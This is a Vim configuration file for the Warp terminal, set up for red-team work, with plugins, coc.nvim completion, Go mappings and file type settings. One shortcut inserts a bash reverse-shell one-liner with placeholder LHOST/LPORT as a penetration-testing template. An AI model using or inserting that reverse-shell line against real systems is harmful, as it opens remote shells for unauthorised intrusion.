" =============================================================================
" Basic Settings - Warp Terminal Optimized
" =============================================================================
syntax enable
set nocompatible            " Be iMproved, required for some plugins
filetype plugin indent on   " Enable filetype detection and indentation

" Warp Terminal Optimizations
if $TERM_PROGRAM ==# 'WarpTerminal'
    set termguicolors       " Enable true color support in Warp
    set t_Co=256            " 256 color support
    set mouse=a             " Enable mouse support
else
    " Fallback for other terminals
    if has('termguicolors')
        set termguicolors
    endif
endif

" General UI - Enhanced for terminal performance
set ignorecase              " Ignore case when searching
set smartcase               " Don't ignore case if search pattern contains uppercase
set nowrap                  " Don't wrap lines
set number                  " Show line numbers
set relativenumber          " Show relative line numbers
set ruler                   " Show row and column in status line
set showcmd                 " Show incomplete commands
set smartindent             " Smart auto-indenting
set shiftwidth=4            " Number of spaces to use for autoindent (better for code)
set tabstop=4               " Number of spaces that a tab in the file uses
set expandtab               " Use spaces instead of tabs
set backspace=indent,eol,start " Make backspace work like most other editors
set hidden                  " Allow buffers to be hidden
set noerrorbells            " Don't beep
set visualbell              " Use visual bell instead of audible bell
set wildmenu                " Enhanced command-line completion
set wildmode=longest:full,full " Better command-line completion
set scrolloff=8             " Keep 8 lines above/below cursor when scrolling
set sidescrolloff=8         " Keep 8 columns left/right when scrolling
set cmdheight=2             " Give more space for messages
set updatetime=100          " Faster update for plugins and git signs
set timeoutlen=500          " Faster key sequence timeout
set laststatus=2            " Always show status line
set showmatch               " Show matching brackets
set cursorline              " Highlight current line
set lazyredraw              " Don't redraw while executing macros (performance)
set ttyfast                 " Fast terminal connection

" Search
set hlsearch                " Highlight search results
set incsearch               " Incremental search

" Persistent Undo
set undofile                " Save undo history
set undodir=~/.vim/undodir  " Directory to save undo files

" Leader Key
let mapleader = ","         " Set leader key to comma
let maplocalleader = "\\"   " Set localleader key to backslash

" =============================================================================
" Plugin Management (vim-plug)
" =============================================================================
call plug#begin('~/.vim/plugged')

" Theme - Dark themes optimized for terminal work
Plug 'dracula/vim', { 'as': 'dracula' }
Plug 'catppuccin/vim', { 'as': 'catppuccin' }
Plug 'tomasr/molokai'

" General Utilities
Plug 'tpope/vim-fugitive'              " Git integration
Plug 'tpope/vim-surround'              " Surround text objects
Plug 'tpope/vim-commentary'            " Easy commenting
Plug 'scrooloose/nerdtree'             " File explorer
Plug 'Xuyuanp/nerdtree-git-plugin'     " Git status in NERDTree
Plug 'vim-airline/vim-airline'         " Status line
Plug 'vim-airline/vim-airline-themes'  " Airline themes
Plug 'junegunn/fzf', { 'do': { -> fzf#install() } }  " Fuzzy finder
Plug 'junegunn/fzf.vim'                " FZF vim integration

" Language Support
Plug 'fatih/vim-go', { 'do': ':GoUpdateBinaries' }  " Go development
Plug 'neoclide/coc.nvim', {'branch': 'release'}     " Language server protocol
Plug 'sheerun/vim-polyglot'            " Language pack

" Red Team Specific
Plug 'vim-scripts/indentpython.vim'    " Python indentation
Plug 'plasticboy/vim-markdown'         " Markdown support for reports
Plug 'instant-markdown/vim-instant-markdown', {'for': 'markdown', 'do': 'yarn install'}

call plug#end()

" =============================================================================
" Theme Configuration - Warp Optimized
" =============================================================================
set background=dark

" Try to set the best available colorscheme
silent! colorscheme catppuccin_mocha
if g:colors_name !=# 'catppuccin_mocha'
    silent! colorscheme dracula
    if g:colors_name !=# 'dracula'
        silent! colorscheme molokai
    endif
endif

" Enhanced syntax highlighting
set synmaxcol=200           " Limit syntax highlighting for performance
syntax sync minlines=256    " Start syntax highlighting from 256 lines back

" =============================================================================
" Plugin Specific Settings - Red Team Enhanced
" =============================================================================

" NERDTree
map <C-n> :NERDTreeToggle<CR>
let g:NERDTreeDirArrowExpandable = '▸'
let g:NERDTreeDirArrowCollapsible = '▾'
let g:NERDTreeWinSize = 30
let g:NERDTreeShowHidden = 1
let g:NERDTreeMinimalUI = 1
let g:NERDTreeDirArrows = 1
let g:NERDTreeIgnore = ['\~$', '\.swp$', '\.git$', '__pycache__', '.DS_Store']

" vim-airline
let g:airline_theme='catppuccin_mocha'
let g:airline_powerline_fonts = 1
let g:airline#extensions#tabline#enabled = 1
let g:airline#extensions#tabline#buffer_nr_show = 1
let g:airline#extensions#branch#enabled = 1
let g:airline#extensions#coc#enabled = 1

" FZF settings
nnoremap <C-p> :Files<CR>
nnoremap <C-f> :Rg<CR>
nnoremap <leader>b :Buffers<CR>
nnoremap <leader>h :History<CR>
let g:fzf_preview_window = 'right:60%'
let g:fzf_layout = { 'window': { 'width': 0.9, 'height': 0.6 } }

" COC.nvim
" TextEdit might fail if hidden is not set.
set hidden
" Some servers (e.g. gopls) require this to be set.
set nobackup
set nowritebackup
" Always show the signcolumn, otherwise it would shift the text each time
" diagnostics appear.
set signcolumn=yes
" Use tab for trigger completion with characters ahead and navigate.
" Use command ':verbose imap <tab>' to see where tab is mapped.
inoremap <silent><expr> <TAB>
      \ pumvisible() ? "\<C-n>" :
      \ <SID>check_back_space() ? "\<TAB>" :
      \ coc#refresh()
inoremap <expr><S-TAB> pumvisible() ? "\<C-p>" : "\<C-h>"

function! s:check_back_space() abort
  let col = col('.') - 1
  return !col || getline('.')[col - 1] =~ '\s'
endfunction

" Use <c-space> to trigger completion.
inoremap <silent><expr> <c-space> coc#refresh()

" Use `gd` for goto definition (and `gy` for type definition, `gi` for implementation)
nmap <silent> gd <Plug>(coc-definition)
nmap <silent> gy <Plug>(coc-type-definition)
nmap <silent> gi <Plug>(coc-implementation)
nmap <silent> gr <Plug>(coc-references)

" Use K for show documentation in preview window
nnoremap <silent> K :call <SID>show_documentation()<CR>

function! s:show_documentation()
  if (index(['vim','help'], &filetype) >= 0)
    execute 'h '.expand('<cword>')
  else
    call CocAction('doHover')
  endif
endfunction

" Highlight the symbol and its references when holding the cursor.
autocmd CursorHold * silent call CocActionAsync('highlight')

" Apply TextEdit to current buffer.
nmap <leader>rn <Plug>(coc-rename)

" Formatting selected code
xmap <leader>f  <Plug>(coc-format-selected)
nmap <leader>f  <Plug>(coc-format-selected)

" Go specific settings
au FileType go nmap <leader>r <Plug>(go-run)
au FileType go nmap <leader>b <Plug>(go-build)
au FileType go nmap <leader>t <Plug>(go-test)
au FileType go nmap <leader>c <Plug>(go-coverage-toggle)
au FileType go nmap <Leader>e <Plug>(go-rename)
au FileType go nmap <Leader>s <Plug>(go-implements)
au FileType go nmap <Leader>i <Plug>(go-info)
let g:go_doc_popup_window = 1

" =============================================================================
" Red Team Operations - Enhanced
" =============================================================================

" -- File Type Associations --
" Red team specific file types
au BufRead,BufNewFile *.ps1 set filetype=ps1
au BufRead,BufNewFile *.py set filetype=python | set shiftwidth=4 | set tabstop=4
au BufRead,BufNewFile *.pl set filetype=perl
au BufRead,BufNewFile *.rb set filetype=ruby
au BufRead,BufNewFile *.php set filetype=php
au BufRead,BufNewFile *.yaml,*.yml set filetype=yaml | set shiftwidth=2 | set tabstop=2
au BufRead,BufNewFile *.json set filetype=json | set shiftwidth=2 | set tabstop=2
au BufRead,BufNewFile *.md,*.markdown set filetype=markdown | set wrap | set linebreak
au BufRead,BufNewFile Dockerfile* set filetype=dockerfile
au BufRead,BufNewFile *.conf,*.config set filetype=config
au BufRead,BufNewFile *.log set filetype=log | set nowrap

" -- Red Team Shortcuts --
" Quick templates for common tasks
nnoremap <leader>rs :r !echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'<CR>
nnoremap <leader>py :r !echo '#!/usr/bin/env python3'<CR>
nnoremap <leader>sh :r !echo '#!/bin/bash'<CR>
nnoremap <leader>md :r !echo '# Red Team Report'<CR>:r !echo ''<CR>:r !echo '## Executive Summary'<CR>

" -- Markdown settings for reports --
let g:vim_markdown_folding_disabled = 1
let g:vim_markdown_conceal = 0
let g:vim_markdown_frontmatter = 1

" -- Python specific settings --
autocmd FileType python set colorcolumn=88  " PEP 8 line length
autocmd FileType python set textwidth=88

" -- Search enhancements --
" Highlight all instances of word under cursor
nnoremap <silent> <F8> :let @/='\<<C-R>=expand("<cword>")\><CR>\>'<CR>:set hls<CR>

" -- Quick save and quit --
nnoremap <leader>w :w<CR>
nnoremap <leader>q :q<CR>
nnoremap <leader>x :x<CR>

" -- Buffer navigation --
nnoremap <leader>n :bnext<CR>
nnoremap <leader>p :bprev<CR>
nnoremap <leader>d :bdelete<CR>

" -- Split navigation --
nnoremap <C-h> <C-w>h
nnoremap <C-j> <C-w>j
nnoremap <C-k> <C-w>k
nnoremap <C-l> <C-w>l
